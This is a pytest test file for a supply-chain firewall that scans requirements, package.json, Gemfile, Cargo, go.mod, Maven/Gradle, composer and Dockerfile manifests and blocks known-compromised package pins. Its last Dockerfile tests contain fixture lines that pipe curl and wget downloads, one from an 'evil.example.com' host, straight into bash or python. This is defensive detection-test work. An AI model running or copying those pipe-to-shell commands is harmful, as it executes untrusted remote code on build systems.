"""Tests for :meth:`SupplyChainFirewall.scan_manifest`.

Each ecosystem parser is exercised with a realistic fixture containing
both a known-bad pin (sourced from the built-in threat feed) and at
least one clean pin. The tests assert the overall verdict + the
block/clean counts, not the specific wording of individual threat
strings.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from ghostgap.core import Ecosystem, SupplyChainFirewall, Verdict


@pytest.fixture
def fw() -> SupplyChainFirewall:
    return SupplyChainFirewall()


# ── Ecosystem detection ────────────────────────────────────────────


class TestDetectEcosystem:
    @pytest.mark.parametrize(
        "filename,expected",
        [
            ("requirements.txt", Ecosystem.PYTHON),
            ("setup.py", Ecosystem.PYTHON),
            ("pyproject.toml", Ecosystem.PYTHON),
            ("pipfile", Ecosystem.PYTHON),
            ("package.json", Ecosystem.NODEJS),
            ("package-lock.json", Ecosystem.NODEJS),
            ("yarn.lock", Ecosystem.NODEJS),
            ("pnpm-lock.yaml", Ecosystem.NODEJS),
            ("Cargo.toml", Ecosystem.RUST),
            ("Cargo.lock", Ecosystem.RUST),
            ("Gemfile", Ecosystem.RUBY),
            ("Gemfile.lock", Ecosystem.RUBY),
            ("go.mod", Ecosystem.GO),
            ("go.sum", Ecosystem.GO),
            ("pom.xml", Ecosystem.JAVA),
            ("build.gradle", Ecosystem.JAVA),
            ("build.gradle.kts", Ecosystem.JAVA),
            ("composer.json", Ecosystem.PHP),
            ("composer.lock", Ecosystem.PHP),
            ("Dockerfile", Ecosystem.DOCKER),
            ("dockerfile", Ecosystem.DOCKER),
        ],
    )
    def test_detect(self, fw, filename, expected, tmp_path):
        p = tmp_path / filename
        p.write_text("")
        assert fw._detect_ecosystem(str(p)) is expected

    def test_unknown_defaults_to_python(self, fw, tmp_path):
        p = tmp_path / "mystery.cfg"
        p.write_text("# unknown format")
        assert fw._detect_ecosystem(str(p)) is Ecosystem.PYTHON


# ── Python requirements.txt ────────────────────────────────────────


class TestPythonManifest:
    def test_clean_requirements_all_allow(self, fw, tmp_path):
        req = tmp_path / "requirements.txt"
        req.write_text(
            "requests==2.32.0\n"
            "pydantic>=2.8.0\n"
            "# comment\n"
            "\n"
            "structlog\n"
        )
        report = fw.scan_manifest(str(req))
        assert report.ecosystem is Ecosystem.PYTHON
        assert report.total_packages == 3
        assert report.blocked == 0
        assert report.overall_verdict is Verdict.ALLOW

    def test_known_bad_pin_blocks(self, fw, tmp_path):
        req = tmp_path / "requirements.txt"
        req.write_text(
            "litellm==1.82.7\n"  # known compromised
            "requests==2.32.0\n"
        )
        report = fw.scan_manifest(str(req))
        assert report.total_packages == 2
        assert report.blocked == 1
        assert report.overall_verdict is Verdict.BLOCK
        assert any(v.package == "litellm" for v in report.verdicts)

    def test_comments_and_options_ignored(self, fw, tmp_path):
        req = tmp_path / "requirements.txt"
        req.write_text(
            "# pinned because of CVE-2024-xyz\n"
            "-e ./local-pkg\n"
            "--index-url https://pypi.org\n"
            "requests==2.32.0\n"
        )
        report = fw.scan_manifest(str(req))
        assert report.total_packages == 1

    def test_missing_file_returns_empty_report(self, fw, tmp_path):
        """A missing file should produce a zero-package report, not
        raise. Services that scan CI repos often encounter missing
        optional manifests and shouldn't crash on them."""
        report = fw.scan_manifest(str(tmp_path / "nope.txt"))
        assert report.total_packages == 0


# ── Node.js package.json ───────────────────────────────────────────


class TestNpmManifest:
    def test_clean_package_json(self, fw, tmp_path):
        p = tmp_path / "package.json"
        p.write_text(
            '{"name": "demo", "version": "1.0.0", "dependencies": '
            '{"express": "4.18.0", "lodash": "4.17.21"}}'
        )
        report = fw.scan_manifest(str(p))
        assert report.ecosystem is Ecosystem.NODEJS
        assert report.total_packages == 2
        assert report.blocked == 0

    def test_known_bad_blocks(self, fw, tmp_path):
        p = tmp_path / "package.json"
        p.write_text(
            '{"dependencies": '
            '{"event-stream": "^3.3.6", "express": "4.18.0"}}'
        )
        report = fw.scan_manifest(str(p))
        assert report.blocked == 1
        assert report.overall_verdict is Verdict.BLOCK

    def test_dev_dependencies_scanned(self, fw, tmp_path):
        p = tmp_path / "package.json"
        p.write_text(
            '{"devDependencies": {"ua-parser-js": "0.7.29"}}'
        )
        report = fw.scan_manifest(str(p))
        assert report.blocked == 1

    def test_malformed_json_empty_report(self, fw, tmp_path):
        p = tmp_path / "package.json"
        p.write_text("{not valid json")
        report = fw.scan_manifest(str(p))
        assert report.total_packages == 0


# ── Ruby Gemfile + Gemfile.lock ────────────────────────────────────


class TestRubyManifest:
    def test_gemfile_lock_blocks_rest_client(self, fw, tmp_path):
        p = tmp_path / "Gemfile.lock"
        p.write_text(
            "GEM\n"
            "  remote: https://rubygems.org/\n"
            "  specs:\n"
            "    rest-client (1.6.13)\n"
            "    rake (13.0.6)\n"
        )
        report = fw.scan_manifest(str(p))
        assert report.ecosystem is Ecosystem.RUBY
        assert report.blocked == 1
        assert report.total_packages == 2

    def test_gemfile_blocks_strong_password(self, fw, tmp_path):
        p = tmp_path / "Gemfile"
        p.write_text(
            "source 'https://rubygems.org'\n"
            "gem 'rails', '~> 7.0.0'\n"
            "gem 'strong_password', '0.0.7'\n"
        )
        report = fw.scan_manifest(str(p))
        assert report.blocked == 1
        assert report.total_packages == 2


# ── Rust Cargo.toml + Cargo.lock ───────────────────────────────────


class TestRustManifest:
    def test_cargo_lock_blocks_rustdecimal(self, fw, tmp_path):
        p = tmp_path / "Cargo.lock"
        p.write_text(
            'name = "serde"\n'
            'version = "1.0.200"\n'
            'name = "rustdecimal"\n'
            'version = "1.23.1"\n'
        )
        report = fw.scan_manifest(str(p))
        assert report.ecosystem is Ecosystem.RUST
        assert report.blocked == 1

    def test_cargo_toml_parses_dependencies_section(self, fw, tmp_path):
        p = tmp_path / "Cargo.toml"
        p.write_text(
            '[package]\n'
            'name = "demo"\n'
            '\n'
            '[dependencies]\n'
            'serde = "1.0.200"\n'
            'rustdecimal = "1.23.1"\n'
        )
        report = fw.scan_manifest(str(p))
        assert report.total_packages >= 1


# ── Go go.mod ──────────────────────────────────────────────────────


class TestGoManifest:
    def test_go_mod_clean(self, fw, tmp_path):
        p = tmp_path / "go.mod"
        p.write_text(
            "module example.com/demo\n"
            "\n"
            "go 1.22\n"
            "\n"
            "require (\n"
            "    github.com/google/uuid v1.6.0\n"
            ")\n"
        )
        report = fw.scan_manifest(str(p))
        assert report.ecosystem is Ecosystem.GO
        assert report.blocked == 0


# ── Java pom.xml + build.gradle ────────────────────────────────────


class TestJavaManifest:
    def test_pom_xml_blocks_log4shell(self, fw, tmp_path):
        p = tmp_path / "pom.xml"
        p.write_text(
            '<project>\n'
            '  <dependencies>\n'
            '    <dependency>\n'
            '      <groupId>org.apache.logging.log4j</groupId>\n'
            '      <artifactId>log4j-core</artifactId>\n'
            '      <version>2.14.0</version>\n'
            '    </dependency>\n'
            '  </dependencies>\n'
            '</project>\n'
        )
        report = fw.scan_manifest(str(p))
        assert report.ecosystem is Ecosystem.JAVA
        assert report.blocked == 1
        assert report.overall_verdict is Verdict.BLOCK

    def test_build_gradle_blocks_log4shell(self, fw, tmp_path):
        p = tmp_path / "build.gradle"
        p.write_text(
            "dependencies {\n"
            "    implementation 'org.apache.logging.log4j:log4j-core:2.14.0'\n"
            "    implementation 'com.google.guava:guava:32.0.0-jre'\n"
            "}\n"
        )
        report = fw.scan_manifest(str(p))
        assert report.blocked == 1


# ── PHP composer.json + composer.lock ──────────────────────────────


class TestPhpManifest:
    def test_composer_json_clean(self, fw, tmp_path):
        p = tmp_path / "composer.json"
        p.write_text(
            '{"require": {"monolog/monolog": "^3.0"}}'
        )
        report = fw.scan_manifest(str(p))
        assert report.ecosystem is Ecosystem.PHP
        assert report.blocked == 0


# ── Dockerfile ─────────────────────────────────────────────────────


class TestDockerfile:
    def test_pinned_image_clean(self, fw, tmp_path):
        p = tmp_path / "Dockerfile"
        p.write_text(
            "FROM python:3.12-slim\n"
            "COPY . /app\n"
            "RUN pip install -r /app/requirements.txt\n"
        )
        report = fw.scan_manifest(str(p))
        assert report.ecosystem is Ecosystem.DOCKER
        assert report.clean == 1
        assert report.overall_verdict is Verdict.ALLOW

    def test_latest_tag_flags_review(self, fw, tmp_path):
        p = tmp_path / "Dockerfile"
        p.write_text("FROM python:latest\n")
        report = fw.scan_manifest(str(p))
        assert report.review == 1
        assert report.overall_verdict is Verdict.REVIEW

    def test_unpinned_image_flags_review(self, fw, tmp_path):
        p = tmp_path / "Dockerfile"
        p.write_text("FROM python\n")
        report = fw.scan_manifest(str(p))
        assert report.review == 1

    def test_curl_pipe_shell_blocks(self, fw, tmp_path):
        p = tmp_path / "Dockerfile"
        p.write_text(
            "FROM python:3.12-slim\n"
            "RUN curl https://evil.example.com/install.sh | bash\n"
        )
        report = fw.scan_manifest(str(p))
        assert report.blocked >= 1
        assert report.overall_verdict is Verdict.BLOCK

    def test_wget_pipe_python_blocks(self, fw, tmp_path):
        p = tmp_path / "Dockerfile"
        p.write_text(
            "FROM python:3.12-slim\n"
            "RUN wget -qO- https://x.com/script.py | python\n"
        )
        report = fw.scan_manifest(str(p))
        assert report.blocked >= 1
